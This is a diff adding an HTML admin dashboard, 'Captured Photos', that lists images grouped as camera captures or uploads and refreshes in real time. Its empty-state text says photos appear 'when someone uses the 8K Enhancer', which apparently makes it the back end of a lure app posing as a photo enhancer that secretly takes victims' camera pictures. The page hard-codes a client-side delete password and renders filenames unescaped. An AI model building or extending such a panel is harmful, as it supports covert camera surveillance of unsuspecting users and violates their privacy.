@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Admin Panel — Captured Photos</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --card: #1a1a2e;
+            --accent: #6c5ce7;
+            --accent2: #a29bfe;
+            --text: #e0e0e0;
+            --text2: #a0a0b0;
+            --success: #00b894;
+            --danger: #ff6b6b;
+            --warning: #fdcb6e;
+            --border: #2d2d44;
+            --radius: 16px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(ellipse at 50% 0%, rgba(108,92,231,0.1) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 30%, rgba(162,155,254,0.06) 0%, transparent 50%);
+            background-attachment: fixed;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            background: var(--card);
+            border-bottom: 1px solid var(--border);
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left h1 {
+            font-size: 1.5em;
+            background: linear-gradient(135deg, var(--accent2), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-left .subtitle {
+            font-size: 0.75em;
+            color: var(--text2);
+            margin-top: 2px;
+        }
+
+        .stats-row {
+            display: flex;
+            gap: 25px;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 10px 18px;
+            background: var(--bg);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .stat-item .stat-num {
+            font-size: 1.6em;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--accent2), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-item .stat-label {
+            font-size: 0.7em;
+            color: var(--text2);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* ===== CONTAINER ===== */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+
+        /* ===== ACTIONS BAR ===== */
+        .actions-bar {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: var(--card);
+            color: var(--text);
+            cursor: pointer;
+            font-size: 0.9em;
+            font-weight: 500;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 20px rgba(108,92,231,0.2);
+        }
+
+        .btn-danger {
+            background: rgba(255,107,107,0.1);
+            border-color: var(--danger);
+            color: var(--danger);
+        }
+
+        .btn-danger:hover {
+            background: rgba(255,107,107,0.2);
+        }
+
+        .last-update {
+            margin-left: auto;
+            color: var(--text2);
+            font-size: 0.8em;
+        }
+
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8em;
+            color: var(--text2);
+        }
+
+        .auto-refresh .dot {
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ===== SOURCE CARDS ===== */
+        .sources-grid {
+            display: grid;
+            gap: 20px;
+        }
+
+        .source-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .source-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 30px rgba(108,92,231,0.15);
+        }
+
+        .source-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 22px;
+            border-bottom: 1px solid var(--border);
+            background: rgba(108,92,231,0.03);
+        }
+
+        .source-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .source-icon {
+            width: 45px;
+            height: 45px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+        }
+
+        .source-icon.camera {
+            background: rgba(255,107,107,0.15);
+            color: var(--danger);
+        }
+
+        .source-icon.uploaded {
+            background: rgba(0,184,148,0.15);
+            color: var(--success);
+        }
+
+        .source-name {
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+
+        .source-meta {
+            font-size: 0.75em;
+            color: var(--text2);
+            margin-top: 3px;
+        }
+
+        .source-count {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 14px;
+            background: var(--bg);
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9em;
+            color: var(--accent2);
+        }
+
+        .source-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        /* ===== PHOTO PREVIEW STRIP ===== */
+        .photo-strip {
+            display: flex;
+            gap: 10px;
+            padding: 18px 22px;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+        }
+
+        .photo-strip::-webkit-scrollbar {
+            height: 6px;
+        }
+
+        .photo-strip::-webkit-scrollbar-track {
+            background: var(--bg);
+            border-radius: 3px;
+        }
+
+        .photo-strip::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+
+        .photo-thumb {
+            width: 130px;
+            height: 130px;
+            border-radius: 10px;
+            object-fit: cover;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+            flex-shrink: 0;
+        }
+
+        .photo-thumb:hover {
+            border-color: var(--accent);
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+        }
+
+        .show-all-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 12px 22px;
+            margin: 0 22px 18px;
+            background: rgba(108,92,231,0.1);
+            border: 1px dashed var(--accent);
+            border-radius: 10px;
+            color: var(--accent2);
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .show-all-btn:hover {
+            background: rgba(108,92,231,0.2);
+            border-style: solid;
+        }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            max-width: 90vw;
+            max-height: 90vh;
+            width: 800px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 22px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .modal-header h3 {
+            font-size: 1.1em;
+        }
+
+        .modal-close {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            border: 1px solid var(--border);
+            background: transparent;
+            color: var(--text);
+            cursor: pointer;
+            font-size: 1.2em;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .modal-close:hover {
+            background: var(--danger);
+            border-color: var(--danger);
+        }
+
+        .modal-body {
+            padding: 20px;
+            overflow-y: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 12px;
+            max-height: 60vh;
+        }
+
+        .modal-body img {
+            width: 100%;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .modal-body img:hover {
+            border-color: var(--accent);
+            transform: scale(1.03);
+        }
+
+        .modal-footer {
+            padding: 15px 22px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* ===== DELETE PASSWORD MODAL ===== */
+        .password-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .password-modal.active {
+            display: flex;
+        }
+
+        .password-box {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 35px;
+            text-align: center;
+            width: 380px;
+        }
+
+        .password-box h3 {
+            margin-bottom: 8px;
+        }
+
+        .password-box p {
+            color: var(--text2);
+            font-size: 0.85em;
+            margin-bottom: 18px;
+        }
+
+        .password-box input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: var(--bg);
+            color: var(--text);
+            font-size: 1em;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .password-box .btn-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .password-box .btn-row button {
+            flex: 1;
+        }
+
+        .error-msg {
+            color: var(--danger);
+            font-size: 0.8em;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* ===== FULLSCREEN IMAGE ===== */
+        .fullscreen-view {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 3000;
+            display: none;
+            cursor: pointer;
+        }
+
+        .fullscreen-view.active {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .fullscreen-view img {
+            max-width: 95vw;
+            max-height: 95vh;
+            border-radius: 10px;
+        }
+
+        /* ===== EMPTY STATE ===== */
+        .empty-state {
+            text-align: center;
+            padding: 100px 20px;
+            color: var(--text2);
+        }
+
+        .empty-state .icon {
+            font-size: 80px;
+            margin-bottom: 15px;
+        }
+
+        .empty-state h2 {
+            margin-bottom: 8px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 15px;
+                padding: 15px;
+            }
+            
+            .stats-row {
+                gap: 10px;
+            }
+            
+            .stat-item {
+                padding: 8px 12px;
+            }
+            
+            .stat-item .stat-num {
+                font-size: 1.2em;
+            }
+            
+            .photo-thumb {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .source-header {
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+            
+            .source-actions {
+                width: 100%;
+            }
+            
+            .source-actions .btn {
+                flex: 1;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- HEADER -->
+    <div class="header">
+        <div class="header-left">
+            <h1>🔐 Admin Panel — Captured Photos</h1>
+            <div class="subtitle">👑 Created by MOHSIN | Real-time monitoring</div>
+        </div>
+        <div class="stats-row">
+            <div class="stat-item">
+                <div class="stat-num" id="sourceCount">0</div>
+                <div class="stat-label">Sources</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="totalPhotos">0</div>
+                <div class="stat-label">Total Photos</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="cameraCount">0</div>
+                <div class="stat-label">📸 Camera</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="uploadCount">0</div>
+                <div class="stat-label">📤 Uploaded</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN -->
+    <div class="container">
+        <!-- Actions Bar -->
+        <div class="actions-bar">
+            <button class="btn" onclick="refreshPhotos()">🔄 Refresh Now</button>
+            <button class="btn btn-danger" onclick="confirmDeleteAll()">🗑️ Delete All Sources</button>
+            <div class="auto-refresh">
+                <div class="dot"></div>
+                Auto-refresh active
+            </div>
+            <div class="last-update" id="lastUpdate">Ready</div>
+        </div>
+
+        <!-- Sources Grid -->
+        <div class="sources-grid" id="sourcesGrid"></div>
+
+        <!-- Empty State -->
+        <div class="empty-state" id="emptyState">
+            <div class="icon">📸</div>
+            <h2>No photos captured yet</h2>
+            <p>Photos will appear here when someone uses the 8K Enhancer</p>
+        </div>
+    </div>
+
+    <!-- ALL PHOTOS MODAL -->
+    <div class="modal-overlay" id="allPhotosModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">📸 All Photos</h3>
+                <button class="modal-close" onclick="closeModal()">✕</button>
+            </div>
+            <div class="modal-body" id="modalBody"></div>
+            <div class="modal-footer">
+                <span style="color:var(--text2);" id="modalCount"></span>
+                <button class="btn" onclick="closeModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- DELETE PASSWORD MODAL -->
+    <div class="password-modal" id="passwordModal">
+        <div class="password-box">
+            <h3>🔐 Enter Delete Password</h3>
+            <p>Password required to delete photos</p>
+            <input type="password" id="deletePassword" placeholder="Enter password...">
+            <div class="btn-row">
+                <button class="btn" onclick="closePasswordModal()">Cancel</button>
+                <button class="btn btn-danger" onclick="confirmWithPassword()">🗑️ Delete</button>
+            </div>
+            <div class="error-msg" id="passwordError">❌ Wrong password!</div>
+        </div>
+    </div>
+
+    <!-- FULLSCREEN VIEW -->
+    <div class="fullscreen-view" id="fullscreenView" onclick="closeFullscreen()">
+        <img id="fullscreenImage" src="" alt="Fullscreen">
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        // ===== CONFIG =====
+        const DELETE_PASSWORD = 'mohsin123';  // ← YAHAN DELETE PASSWORD SET KARO
+        let allPhotos = [];
+        let pendingDeleteSource = null;
+        let pendingDeleteAll = false;
+
+        // ===== SOCKET =====
+        const socket = io();
+        
+        socket.on('connect', () => {
+            console.log('✅ Admin connected');
+        });
+
+        socket.on('new_photo', (photo) => {
+            console.log('📸 New photo received!');
+            refreshPhotos();
+        });
+
+        // ===== FETCH & RENDER =====
+        async function refreshPhotos() {
+            try {
+                const response = await fetch('/api/get-all-photos');
+                const data = await response.json();
+                
+                if (data.success) {
+                    allPhotos = data.photos || [];
+                    renderSources(allPhotos);
+                    updateStats(allPhotos);
+                    document.getElementById('lastUpdate').textContent = 
+                        'Updated: ' + new Date().toLocaleTimeString();
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+            }
+        }
+
+        // ===== GROUP BY SOURCE =====
+        function groupBySource(photos) {
+            const groups = {};
+            
+            photos.forEach(photo => {
+                // Extract source from filename
+                // camera_20240605_... → source = "camera"
+                // upload_20240605_... → source = "uploaded"
+                let source = photo.type || 'unknown';
+                
+                // Group by type + date (same session)
+                let dateKey = photo.timestamp.split(' ')[0]; // Just the date
+                let sourceKey = `${source}_${dateKey}`;
+                
+                if (!groups[sourceKey]) {
+                    groups[sourceKey] = {
+                        sourceKey: sourceKey,
+                        type: source,
+                        date: dateKey,
+                        photos: [],
+                        firstTime: photo.timestamp,
+                    };
+                }
+                groups[sourceKey].photos.push(photo);
+            });
+            
+            return Object.values(groups).sort((a, b) => 
+                new Date(b.firstTime) - new Date(a.firstTime)
+            );
+        }
+
+        function renderSources(photos) {
+            const grid = document.getElementById('sourcesGrid');
+            const empty = document.getElementById('emptyState');
+            
+            if (!photos || photos.length === 0) {
+                grid.innerHTML = '';
+                empty.style.display = 'block';
+                return;
+            }
+            
+            empty.style.display = 'none';
+            
+            const groups = groupBySource(photos);
+            
+            grid.innerHTML = groups.map((group, idx) => {
+                const displayPhotos = group.photos.slice(0, 8); // Show first 8
+                const remaining = group.photos.length - 8;
+                
+                const iconClass = group.type === 'camera' ? 'camera' : 'uploaded';
+                const iconEmoji = group.type === 'camera' ? '📸' : '📤';
+                const sourceLabel = group.type === 'camera' ? 'Camera Capture' : 'Uploaded Photo';
+                
+                return `
+                    <div class="source-card">
+                        <div class="source-header">
+                            <div class="source-info">
+                                <div class="source-icon ${iconClass}">${iconEmoji}</div>
+                                <div>
+                                    <div class="source-name">${sourceLabel}</div>
+                                    <div class="source-meta">
+                                        📅 ${group.date} • 🕐 ${group.firstTime}
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="source-actions">
+                                <div class="source-count">
+                                    📷 ${group.photos.length} photos
+                                </div>
+                                <button class="btn btn-danger" onclick="requestDeleteSource('${group.sourceKey}')" title="Delete this source">
+                                    🗑️
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="photo-strip">
+                            ${displayPhotos.map(p => `
+                                <img src="/api/photo/${p.filename}" 
+                                     class="photo-thumb" 
+                                     onclick="openFullscreen('/api/photo/${p.filename}')"
+                                     loading="lazy"
+                                     title="${p.timestamp}">
+                            `).join('')}
+                            ${remaining > 0 ? `
+                                <div class="photo-thumb" style="background:var(--bg); display:flex; align-items:center; justify-content:center; cursor:pointer;" 
+                                     onclick="showAllPhotos('${group.sourceKey}')">
+                                    <span style="font-size:2em;">+${remaining}</span>
+                                </div>
+                            ` : ''}
+                        </div>
+                        
+                        ${group.photos.length > 8 ? `
+                            <div class="show-all-btn" onclick="showAllPhotos('${group.sourceKey}')">
+                                📋 Show All ${group.photos.length} Photos
+                            </div>
+                        ` : ''}
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // ===== SHOW ALL PHOTOS IN MODAL =====
+        function showAllPhotos(sourceKey) {
+            const group = groupBySource(allPhotos).find(g => g.sourceKey === sourceKey);
+            if (!group) return;
+            
+            document.getElementById('modalTitle').textContent = 
+                `📸 ${group.type === 'camera' ? 'Camera Captures' : 'Uploaded Photos'} — ${group.date}`;
+            
+            document.getElementById('modalBody').innerHTML = group.photos.map(p => `
+                <img src="/api/photo/${p.filename}" 
+                     onclick="openFullscreen('/api/photo/${p.filename}')"
+                     loading="lazy"
+                     title="${p.timestamp}">
+            `).join('');
+            
+            document.getElementById('modalCount').textContent = 
+                `Total: ${group.photos.length} photos`;
+            
+            document.getElementById('allPhotosModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('allPhotosModal').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        // ===== DELETE WITH PASSWORD =====
+        function requestDeleteSource(sourceKey) {
+            pendingDeleteSource = sourceKey;
+            pendingDeleteAll = false;
+            document.getElementById('deletePassword').value = '';
+            document.getElementById('passwordError').style.display = 'none';
+            document.getElementById('passwordModal').classList.add('active');
+        }
+
+        function confirmDeleteAll() {
+            pendingDeleteSource = null;
+            pendingDeleteAll = true;
+            document.getElementById('deletePassword').value = '';
+            document.getElementById('passwordError').style.display = 'none';
+            document.getElementById('passwordModal').classList.add('active');
+        }
+
+        function closePasswordModal() {
+            document.getElementById('passwordModal').classList.remove('active');
+            pendingDeleteSource = null;
+            pendingDeleteAll = false;
+        }
+
+        async function confirmWithPassword() {
+            const password = document.getElementById('deletePassword').value;
+            
+            if (password !== DELETE_PASSWORD) {
+                document.getElementById('passwordError').style.display = 'block';
+                return;
+            }
+            
+            if (pendingDeleteAll) {
+                await deleteAllPhotos();
+            } else if (pendingDeleteSource) {
+                await deleteSource(pendingDeleteSource);
+            }
+            
+            document.getElementById('passwordModal').classList.remove('active');
+            pendingDeleteSource = null;
+            pendingDeleteAll = false;
+        }
+
+        async function deleteSource(sourceKey) {
+            try {
+                const group = groupBySource(allPhotos).find(g => g.sourceKey === sourceKey);
+                if (!group) return;
+                
+                for (const photo of group.photos) {
+                    await fetch('/api/delete-photo', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename: photo.filename })
+                    });
+                }
+                
+                refreshPhotos();
+            } catch (error) {
+                console.error('Delete error:', error);
+            }
+        }
+
+        async function deleteAllPhotos() {
+            try {
+                await fetch('/api/delete-all', { method: 'POST' });
+                refreshPhotos();
+            } catch (error) {
+                console.error('Delete error:', error);
+            }
+        }
+
+        // ===== FULLSCREEN =====
+        function openFullscreen(src) {
+            document.getElementById('fullscreenImage').src = src;
+            document.getElementById('fullscreenView').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeFullscreen() {
+            document.getElementById('fullscreenView').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        // ===== STATS =====
+        function updateStats(photos) {
+            const groups = groupBySource(photos);
+            const cameraPhotos = photos.filter(p => p.type === 'camera').length;
+            const uploadedPhotos = photos.filter(p => p.type === 'uploaded').length;
+            
+            document.getElementById('sourceCount').textContent = groups.length;
+            document.getElementById('totalPhotos').textContent = photos.length;
+            document.getElementById('cameraCount').textContent = cameraPhotos;
+            document.getElementById('uploadCount').textContent = uploadedPhotos;
+        }
+
+        // ===== INIT =====
+        refreshPhotos();
+        setInterval(refreshPhotos, 5000);
+
+        // ===== KEYBOARD =====
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeModal();
+                closeFullscreen();
+                closePasswordModal();
+            }
+        });
+
+        // ===== CLICK OUTSIDE MODAL =====
+        document.getElementById('allPhotosModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+    </script>
+</body>
+</html>
